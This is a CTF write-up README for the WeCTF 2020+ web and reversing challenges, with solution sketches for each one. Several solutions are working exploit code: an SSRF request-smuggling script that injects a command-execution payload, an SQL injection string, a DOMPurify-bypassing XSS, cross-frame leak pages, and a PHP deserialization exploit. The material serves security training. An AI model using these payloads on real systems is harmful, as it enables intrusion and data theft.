# WeCTF 2020+
Thank you all for participating! This README contains our writeup sketches. You can also share your writeup on CTFtime.

Event Link: https://ctftime.org/event/1072

## Run Challenges Locally
```shell
git clone https://github.com/wectf/2020p
cd 2020p && docker-compose up
```

The mapping is as following

```
localhost:8000 -> babyrev
172.128.1.100:8001 -> KVCloud 
localhost:8003 -> dont-bf-me
localhost:8004 -> Hashtable
localhost:8005 -> Notebin 
localhost:8006 -> Wallet
```

## babyrev
**Description**

Shou only allows his gay friends to view the flag here. We got intels that he used PHP extension for access control and we retrieved a weird binary.

Handout: https://github.com/wectf/2020p/blob/master/babyrev/babyrev.so

Author: @qisu

**Writeup**

The extension compares requests' user-agent with string "Flag Viewer 2.0".

PoC:
```bash
curl -H "User-Agent: Flag Viewer 2.0" [HOST]
```

## Red Team
**Description**

We overheard that Shou's company hoarded a shiny flag at a super secret subdomain.

His company's domain: shoustinycompany.cf (Challenge is down now)

Note: You are allowed to use subdomain scanner in this challenge.


**Writeup**

Step 1: Do a subdomain scan and you would discover `docs.shoustinycompany.cf`

Step 2: You find a few files at that subdomain indicating we need to perform an AXFR attack at 161.35.126.226. 

`logs.txt`

```
[12/19] Eddie started the process following RFC 5936.
[12/18] Shou approved NS records transfering.
[12/17] Eddie proposed to transfer NS records to our looking glass server (161.35.126.226:53). 
[12/16] Shou appointed Eddie to be network admin.
```

`info.txt`

```
### Company's websites
Looking Glass: lookingglassv1.shoustinycompany.cf
Flag: [Removed by Shou]
```

Step 3: You find another subdomain `lookingglassv1.shoustinycompany.cf` with IP 161.35.126.226.

Step 4: Perform AXFR transaction at `lookingglassv1.shoustinycompany.cf` by 

```bash
dig AXFR shoustinycompany.cf @ns1.shoustinycompany.cf
```


## KVCloud 
**Description**

Shou hates to use Redis by TCPing it. He instead built a HTTP wrapper for saving his key-value pairs.

Flag is at /flag.txt.

Hint: How to keep-alive a connection?

Note 1: Remote is not using 127.0.0.1 as Redis host.

Note 2: Try different host if your payload is not working remotely.

Handout: https://github.com/wectf/2020p/blob/master/kvcloud/handout.zip

**Writeup**

SSRF with Connection: keep-alive:
```python3
from requests import *
import urllib
port = 5000
cmd = b"import os; os.system('whoami')"
content_len = str(4 + len(cmd)).encode('ascii')
payload = urllib.parse.quote(b"/x\r\nConnection: keep-alive\r\n" +
	b"Pragma: no-cache\r\n\r\nPOST /debug HTTP/1.1\r\n" + 
	b"Host: 127.0.0.1:5000\r\nUser-Agent: curl/7.68.0\r\n"+ 
	b"Accept: */*\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %s\r\n\r\ncmd=%s" % (
		content_len, cmd), safe='')
c = get("http://[HOST]:%s/get?redis_port=%s&key=%s" % (port, port, payload)).content
print(c)
print("http://[HOST]:%s/get?redis_port=%s&key=%s" % (port, port, payload))
```


## dont-bf-me 
**Description**

Shou uses Recaptcha for his site to make it "safer".

Hint: The password is so long that makes any bruteforcing method impotent.

Handout: https://github.com/wectf/2020p/blob/master/dont-bf-me/handout.zip

**Writeup**

`parse_str` in login.php could overwrite $RECAPTCHA_URL and $CORRECT_PASSWORD. 


## Hashtable
**Description**

Universal hashing could prevent hackers from DoSing the hash table by creating a lot of collisions. Shou doubt that. Prove him correct by DoSing this hash table implemented with universal hashing.

Note: having 10 collisions at the same slot would give you the flag

Handout: https://github.com/wectf/2020p/blob/master/hashtable/handout.zip

**Writeup**

Pseudo Random Number PoC:

Save following file as main.go and run `go run main.go [TIMESTAMP]`.
```go
package main

import (
	"fmt"
	"math/big"
	"math/rand"
	"os"
	"strconv"
)

const TableSize = 10000

var TableSizeBI = big.NewInt(int64(TableSize))

const MaxCollision = 10

type LinkedList struct {
	Content       [MaxCollision]int
	InsertedCount int // count of element in linked list
}

type HashTable struct {
	Content      [TableSize]*LinkedList // array for mapping hash to the linked list
	HashParam1   *big.Int               // p1 for hashing
	HashParam2   *big.Int               // p2 for hashing
	ElementCount int                    // count of all elements in hash table
}

func (t *HashTable) hash(value int) uint {
	v := big.NewInt(int64(value))
	var h big.Int
	h.Exp(v, t.HashParam1, t.HashParam2)
	h.Mod(&h, TableSizeBI)
	return uint(h.Uint64())
}

func (t *HashTable) insert(value int) bool {
	var elementHash = t.hash(value)                
	var linkedListForHash = t.Content[elementHash]
	linkedListForHash.InsertedCount++
	if linkedListForHash.InsertedCount > 10 {
		fmt.Println(linkedListForHash.Content)
		return true
	}
    t.ElementCount++
    linkedListForHash.Content[linkedListForHash.InsertedCount-1] = value
	return false 
}

func main() {
	var t HashTable
    x, _ := strconv.Atoi(os.Args[1])
	rand.Seed(int64(x))
	t.HashParam1 = big.NewInt(int64(rand.Intn(1 << 32)))
    t.HashParam2 = big.NewInt(int64(rand.Intn(1 << 32)))
    for i := 0; i < TableSize; i++ {
		t.Content[i] = &LinkedList{[MaxCollision]int{}, 0}
	}
	t.recreate()
	for i := 1 << 13; i < 1<<16; i++ {
		if t.insert(i) {
			break
		}
	}
}
```


## Hall of Fame
**Description**

We made a Slack bot (@hof) to remember our past winners. Hope no one hacks it cuz we are running it on a really important database.

Handout: https://github.com/wectf/2020p/tree/master/hof

**Writeup**

SQL Injection

Send following content to @hof would yield the flag:
```
rank x') UNION SELECT 1,1,(SELECT flag from flags LIMIT 1) ---
```

## Notebin 
**Description**

Here is where Shou keeps his pathetic diaries and a shinny flag.

**Writeup**

DOM Clobbering => XSS

Set title as following could make content bypass DOMPurify.
```html
<a id="_debug"></a><a id="_debug" name="key" href="sha1:f03e8a370aa8dc80f63a6d67401a692ae72fa530"></a>
```

## Wallet
**Description**

Shou has a habit of saving secret (i.e. flag) in the blockchain. Here is where he stores his bitcoin addresses.

Note: wrap what you find on blockchain with we{.....}

Hint 1: You should leak the bitcoin address in Shou's wallet first.

Hint 2: Shou is using Firefox. Firefox does not have CORB.

Handout: https://github.com/wectf/2020p/blob/master/wallet/handout.zip

**Writeup**
XFS + XSSI + Some recon

0.html:
```html
<form action="http://[HOST]/address" method="post" id="f">
    <input name="address" value='xxxx"'/>
</form>
</body>
<script>
    f.submit()
</script>
```

1.html
```html
<form action="http://[HOST]/style" method="post" id="f">
    <input name="style" value='"Raw'/>
</form>
</body>
<script>
    f.submit()
</script>
```

2.html
```html
<div id=iframe2></div>
<div id=iframe3></div>
<script id="script1"></script>
<script>
    function sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }
    async function main(){
        ifr2 = document.createElement('iframe');
        ifr2.name='attack';
        ifr2.src = "0.html";
        iframe2.appendChild(ifr2);
        await sleep(1000);
        ifr3 = document.createElement('iframe');
        ifr3.name='attack';
        ifr3.src = "1.html";
        iframe3.appendChild(ifr3);
        await sleep(1000);
        sc = document.createElement('script');
        sc.name='attack';
        sc.src = "http://[HOST]/";
        script1.appendChild(sc);
        await sleep(1000);
        dealwithit(style); // <= bitcoin address
    }
    main();
</script>
```

Save 0.html, 1.html, 2.html and send 2.html as payload. 

After getting the bitcoin address, you can find flag in OP_RETURN of one transaction. 

## Wordpress
**Description**

Shou made his first wordpress plugin! Check it out!

Note 1: it is unnecessary to be admin to solve this challenge and to ensure the stability, we removed almost all possible ways to be admin.

Handout: https://github.com/wectf/2020p/blob/master/wordpress/handout.zip

**Writeup**

Wordpress Entry Overwrite + Unsafe Deserialization 
```python
from requests import *
HOST = "http://wordpress.ctf.so/"
import re
des_content = 'a:1:{i:0;O:5:"Upage":4:{s:7:"user_id";N;s:9:"user_info";a:0:{}s:4:"conf";s:5:"/flag";s:16:"disallowed_words";a:0:{}}}'
s = Session()

s.post(f"{HOST}wp-login.php", headers={ 'Cookie':'wordpress_test_cookie=WP Cookie check' }, data={
    "log": "[WORDPRESS EMAIL]",
    "pwd": "[WORDPRESS PASSWORD]",
    "wp-submit": "Log In",
    "redirect_to": HOST,
"testcookie": "1"
})


print(s.post(f"{HOST}wp-admin/admin.php?page=edit_upage", data={
    "key": "session_tokens",
    "value": des_content
}).text)

print(s.get(f"{HOST}wp-admin").text)
```

